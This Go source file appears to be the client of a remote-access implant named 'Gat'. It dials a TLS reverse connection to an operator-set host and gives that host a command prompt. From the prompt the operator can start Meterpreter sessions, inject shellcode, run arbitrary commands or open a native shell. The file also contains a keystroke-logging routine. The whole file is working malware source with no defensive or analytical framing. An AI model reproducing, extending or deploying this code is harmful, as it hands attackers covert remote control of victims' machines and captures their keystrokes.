package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"net"
	"os"
	"strings"
	"fmt"

	"github.com/m1ddl3w4r3/Gat/meterpreter"
	"github.com/m1ddl3w4r3/Gat/shell"
)

const (
	errCouldNotDecode  = 1 << iota
	errHostUnreachable = iota
	errBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

func interactiveShell(conn net.Conn) {
	var (
		exit    = false
		prompt  = "[Gat]> "
		scanner = bufio.NewScanner(conn)
	)

	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "meterpreter":
				if len(argv) > 2 {
					transport := argv[1]
					address := argv[2]
					ok, err := meterpreter.Meterpreter(transport, address)
					if !ok {
						conn.Write([]byte(err.Error() + "\n"))
					}
				} else {
					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
				}
			case "inject":
				if len(argv) > 1 {
					shell.InjectShellcode(argv[1])
				}
			case "exit":
				exit = true
			case "run_shell":
				conn.Write([]byte("Enjoy your native shell\n"))
				runShell(conn)
			default:
				shell.ExecuteCmd(command, conn)
			}

			if exit {
				break
			}

		}
		conn.Write([]byte(prompt))
	}
}

func keylog() {
        // Open a file to write the keystrokes to
        f, err := os.OpenFile("keystrokes.txt", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
        if err != nil {
                fmt.Printf("Error opening file: %v\n", err)
                return
        }
        defer f.Close()

        // Create a buffered writer to write the keystrokes to the file
        w := bufio.NewWriter(f)

        // Read input from the keyboard one character at a time
        reader := bufio.NewReader(os.Stdin)
        for {
                // Read a single character from the keyboard
                char, _, err := reader.ReadRune()
                if err != nil {
                        break
                }

                // Write the character to the file
                w.WriteRune(char)

                // Flush the buffered writer to ensure that the character is written to the file
                w.Flush()
        }
}

func runShell(conn net.Conn) {
	var cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(errHostUnreachable)
	}

	defer conn.Close()

	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(errBadFingerprint)
	}
	interactiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(errCouldNotDecode)
		}
		reverse(connectString, bytesFingerprint)
	}
}
